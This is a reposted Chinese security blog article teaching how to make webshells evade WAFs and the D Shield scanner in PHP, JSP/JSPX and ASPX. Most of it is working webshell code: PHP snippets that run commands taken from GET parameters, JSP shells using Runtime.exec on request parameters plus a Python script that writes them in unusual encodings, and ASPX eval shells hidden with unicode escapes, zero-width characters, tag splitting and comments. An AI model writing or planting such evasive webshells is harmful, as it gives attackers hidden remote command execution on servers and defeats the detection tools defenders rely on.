<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/hpuTGzdEeWqUukiKUlnGoA)<table><tbody><tr><td width="557" valign="top" height="62" style="word-break: break-all;"><section style="margin-bottom: 15px;"><strong>声明：</strong>该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。</section><section>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。</section></td></tr></tbody></table>

  

文章来源：先知社区（Icepaper）

原文地址：https://xz.aliyun.com/t/10937

  

**0x01 php的免杀**

传统的php免杀不用多说了，无非就是各种变形和外部参数获取，对于一些先进的waf和防火墙来说，不论如何解析最终都会到达命令执行的地方，但是如果语法报错的话，就可能导致解析失败了，这里简单说几个利用php版本来进行语义出错的php命令执行方式。  

  

### **1、利用在高版本php语法不换行来执行命令**

```
`<?=``$a=<<< aa``assasssasssasssasssasssasssasssasssasssasssassss```aa;echo `whoami` ```?>`
```

  

#### **5.2 版本报错**

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3o6sazytW3fVDyLdzJQ11rrSCCIZ9k4ic4T8a0KBP3SkNhzib22uYjf6q2wCTRCh8c3DfgqFjhFfA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**5.3 版本报错**

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3o6sazytW3fVDyLdzJQ11hCfsLHTn1iaw0rPR5Q1kcavZ5XmNbMSQQQ8JbJiaahUVYVyTd84xia2Ag/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

#### **5.4 版本报错**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

#### **7.3.4 成功执行命令**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

### **2、利用\特殊符号来引起报错**

```
`<?php```\echo `whoami`;?>``
```

  

#### **5.3 执行命令失败**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

#### **7.3 执行命令失败**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

#### **5.2 成功执行**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**3、十六进制字符串**
-------------

在php7中不认为是数字，php5则依旧为数字，经过测试 5.3 和5.5可以成功执行命令，5.2和php7无法执行。

```
`<?php``$s=substr("aabbccsystem","0x6");``$s(whoami)``?>`
```

  

#### **7.3 命令执行失败**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

#### **5.2 命令执行失败**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

### **5.3 命令执行成功**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

除此之外，还有很多种利用版本差异性来bypass一些没有对所有版本进行检测更新的所谓的"先进waf"。

  
当然，对于我们可以结合垃圾数据，变形混淆，以及大量特殊字符和注释的方式来构造更多的payload,毕竟每家的waf规则不同，配置也不同，与一些传输层面的bypass进行结合产生的可能性就会非常多样。

  

**例如：**

7.0版本的??特性，如果版本为5.x的话就会报错，可以结合一些其他的方式吧

```
`<?php``$a = $_GET['function'] ?? 'whoami';``$b = $_GET['cmd'] ?? 'whoami';``$a(null.(null.$b));`
```

  

**0x02 jsp的免杀**

本人对java研究的不是非常深入，因此主要分享的还是平时收集的几个小tips，如果有没看过的师傅现在看到了也是极好的，java unicode绕过就不再多言。  

  

#### **0、小小Tips**

jsp的后缀可以兼容为jspx的代码，也兼容jspx的所有特性，如CDATA特性。  
jspx的后缀不兼容为jsp的代码，jspx只能用jspx的格式。

  

#### **1、jspx CDATA特性**

在XML元素里，<和&是非法的，遇到<解析器会把该字符解释为新元素的开始，遇到&解析器会把该字符解释为字符实体化编码的开始。

  

但是我们有时候有需要在jspx里添加js代码用到大量的<和&字符，因此可以将脚本代码定义为CDATA。

  

CDATA部分内容会被解析器忽略，此时ameter依旧会与getPar拼接成为getParameter。

```
`格式：<![CDATA[xxxxxxxxxxxxxxxxxxx]]>``例如：String cmd = request.getPar<![CDATA[ameter]]>("shell");`
```

  

#### **2、实体化编码**

```
`if (cmd !=null){` `Process child = Runtime.getRuntime().exec(cmd);` `InputStream in = child.getInputStream();`
```

  

#### **3、利用java支持其他编码格式来进行绕过**

```
`#python2``charset = "utf-8"``data = '''<%Runtime.getRuntime().exec(request.getParameter("i"));%>'''.format(charset=charset)``f16be = open('utf-16be.jsp','wb')``f16be.write('<%@ page contentType="charset=utf-16be" %>')``f16be.write(data.encode('utf-16be'))``f16le = open('utf-16le.jsp','wb')``f16le.write('<jsp:directive.page contentType="charset=utf-16le"/>')``f16le.write(data.encode('utf-16le'))``fcp037 = open('cp037.jsp','wb')``fcp037.write(data.encode('cp037'))``fcp037.write('<%@ page contentType="charset=cp037"/>')`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

可以看到对于D盾的免杀效果还是非常好的。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

****0x03 aspx的免杀****

aspx免杀的方式相对于PHP和java的较少，这里列出5种方式来bypass进行免杀  

```
`unicode编码``空字符串连接``<%%>截断``头部替换``特殊符号@``注释`
```

  

我们以一个普通的冰蝎马作为示例

```
<%@ Page Language="Jscript"%>eval(@Request.Item["pass"],"unsafe");%
```

  

这一步无需多言，一定是会被D盾所查杀的

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

#### **1、unicode编码**

例如eval他可以变为\u0065\u0076\u0061\u006c，经过我本地的测试，它不支持大U和多个0的增加

```
<%@ Page Language="Jscript"%><%\u0065\u0076\u0061\u006c(@Request.Item["pass"],"unsafe");%>
```

  

#### **2、空字符串连接**

在函数字符串中插入这些字符都不会影响脚本的正常运行，在测试前需要注意该类字符插入的位置，否则插入错误的地方会产生报错

```
`\u200c``\u200d``\u200e``\u200f`
```

  

#### **3、使用<%%>语法**

将整个字符串与函数利用<%%>进行分割

```
<%@Page Language=JS%><%eval%><%(Request.%><%Item["pass"],"unsafe");%>
```

  

#### **4、头部免杀**

之前有遇到过检测该字段的<%@ Page Language="C#" %>，这个是标识ASPX的一个字段，针对该字段进行免杀%@Language=CSHARP%，很久之前修改为这样就过了，同样的，可以修改为

```
<%@ Page Language="Jscript"%>------》<%@Page Language=JS%>
```

  

也可以将该字段放在后面，不一定要放前面等

  

#### **5、使用符号**

如哥斯拉webshell存在特征代码，可以添加@符号但是不会影响其解析。

```
`(Context.Session["payload"] == null)``(@Context.@Session["payload"] == null)`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

#### **6、注释可以随意插入**

如下所示为冰蝎部分代码，可以与<%%>结合使用效果会更好。

```
<%/*qi*/Session./*qi*/Add(@"k"/*qi*/,/*qi*/"e45e329feb5d925b"/*qi*/)
```

  

* * *

**关 注 有 礼**

  

  

关注公众号回复“9527”可以免费领取一套HTB靶场文档和视频，“1120”安全参考等杂志电子版，“1208”个人常用高效爆破字典，“0221”2020年酒仙桥文章打包，“2191”潇湘信安文章打包，“1212”在线杀软对比源码+数据源。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==) 还在等什么？赶紧点击下方名片关注学习吧！![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

 ![](http://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdSMdwH23ehXbQrbUlOvt6YLhRjHMxGMsH55CSVdlMC0XEwtoAQI06hia8rd371BcDnQ8bfRmP4YqA/0?wx_fmt=png) ** 潇湘信安 ** 一个不会编程、挖SRC、代码审计的安全爱好者，主要分享一些安全经验、渗透思路、奇淫技巧与知识总结。 119篇原创内容   公众号

* * *

**推 荐 阅 读**

  

  

  

[![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247491360&idx=1&sn=e4c3d356b45d7fe821dc2b645f30a595&chksm=cfa6bb33f8d132259884026238db7b79f33da3f3fff2f90a87e4a447118a1be8c4e948031d8f&scene=21#wechat_redirect)

[![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486961&idx=1&sn=d02db4cfe2bdf3027415c76d17375f50&chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&scene=21#wechat_redirect)

[![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

* * *

**欢 迎 私 下 骚 扰**

  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)